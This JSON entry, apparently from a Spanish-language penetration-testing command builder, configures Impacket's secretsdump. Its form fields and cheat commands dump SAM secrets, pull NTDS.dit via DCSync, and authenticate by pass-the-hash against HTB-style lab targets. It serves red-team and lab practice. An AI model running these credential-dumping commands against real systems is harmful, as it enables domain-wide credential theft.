{
 "id": "impacket-secretsdump",
 "name": "Impacket – secretsdump.py",
 "category": "Post-explotación / Active Directory",
 "binary": "impacket-secretsdump",
 "summary": "Vuelca credenciales: SAM/LSA locales, o el NTDS.dit completo de un controlador de dominio vía DCSync.",
 "questions": [
  {
   "id": "auth",
   "type": "select",
   "label": "Autenticación",
   "options": [
    {"id": "plain", "label": "Usuario y contraseña", "frag": ""},
    {"id": "hash", "label": "Pass-the-hash", "frag": ""}
   ]
  },
  {
   "id": "hashes",
   "type": "text",
   "label": "Hash NTLM (LM:NT)",
   "flag": "-hashes {v}",
   "placeholder": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
   "required": true,
   "when": {"auth": "hash"},
   "help": "Si no tienes el LM, usa 32 ceros o deja la parte izquierda vacía."
  },
  {
   "id": "target_plain",
   "type": "text",
   "label": "dominio/usuario:contraseña@IP",
   "flag": "{v}",
   "placeholder": "HTB.LOCAL/administrator:Password123@10.10.10.10",
   "required": true,
   "when": {"auth": "plain"}
  },
  {
   "id": "target_hash",
   "type": "text",
   "label": "dominio/usuario@IP",
   "flag": "{v}",
   "placeholder": "HTB.LOCAL/administrator@10.10.10.10",
   "required": true,
   "when": {"auth": "hash"},
   "help": "Sin contraseña: la autenticación va por -hashes."
  },
  {
   "id": "just_dc",
   "type": "bool",
   "label": "Solo NTDS.dit vía DCSync (-just-dc)",
   "flag": "-just-dc",
   "help": "Úsalo contra un Domain Controller si la cuenta tiene privilegios de replicación (DCSync)."
  },
  {
   "id": "outputfile",
   "type": "text",
   "label": "Prefijo de fichero de salida",
   "flag": "-outputfile {v}",
   "placeholder": "dump",
   "help": "Opcional. Genera .ntds, .sam, .secrets según corresponda."
  }
 ],
 "cheats": [
  {"title": "Dump SAM local con credenciales", "cmd": "impacket-secretsdump HTB.LOCAL/administrator:Password123@10.10.10.10"},
  {"title": "Dump NTDS.dit vía DCSync", "cmd": "impacket-secretsdump -just-dc HTB.LOCAL/administrator:Password123@10.10.10.10"},
  {"title": "Pass-the-hash", "cmd": "impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c HTB.LOCAL/administrator@10.10.10.10"}
 ]
}
